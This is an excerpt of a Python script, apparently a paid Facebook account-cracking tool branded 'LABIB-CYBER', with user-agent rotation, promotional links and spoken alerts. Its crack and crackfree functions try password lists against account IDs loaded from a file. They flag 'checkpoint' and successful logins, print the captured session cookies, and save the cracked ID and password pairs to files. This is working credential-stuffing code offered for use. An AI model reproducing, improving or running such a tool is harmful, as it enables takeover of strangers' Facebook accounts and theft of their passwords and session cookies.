...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/925388339072218/')
#------------------[ Tutul-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",]
ua = ["Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/124.0 Mobile/15E148 Safari/605.1.15",]
ua = ["Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:124.0) Gecko/124.0 Firefox/124.0",]
ua = ["Mozilla/5.0 (Linux; Android 14; Xiaomi Redmi Note 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.44",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",]
...
os.system("xdg-open https://www.facebook.com/labibislam21")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
██       █████  ██████  ██ ██████  
██      ██   ██ ██   ██ ██ ██   ██ 
...
--------------WORKING ONLY MOBILE DATA-------------

[★] OWNER: LABIB-CYBER
[★] FACEBOOK: LABIB ISLAM
[★] TOOLS: PAID
[★] VERSION: 3.1.0
...
os.system('espeak -a 300 " Welcome,   to,  Labib,  cyber,  Tools"')
pass
...
def menu():
    ...
    if TUTUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801611577635')
        os.system("python nono.py")
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/yourfilename.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[LABIB•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Labib-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[LABIB-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Labib,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[LABIB-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•LABIB-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Labib,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
